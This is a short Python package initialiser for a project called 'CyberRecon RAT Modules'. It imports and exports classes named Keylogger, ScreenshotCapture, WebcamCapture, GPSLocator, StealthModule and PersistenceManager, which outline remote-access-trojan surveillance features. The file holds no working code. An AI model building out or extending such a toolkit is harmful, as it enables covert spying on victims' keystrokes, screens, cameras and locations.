"""
CyberRecon RAT Modules
"""

from .keylogger import Keylogger
from .screenshot import ScreenshotCapture
from .webcam import WebcamCapture
from .gps import GPSLocator
from .stealth import StealthModule
from .persistence import PersistenceManager

__all__ = [
    "Keylogger",
    "ScreenshotCapture",
    "WebcamCapture",
    "GPSLocator",
    "StealthModule",
    "PersistenceManager"
]
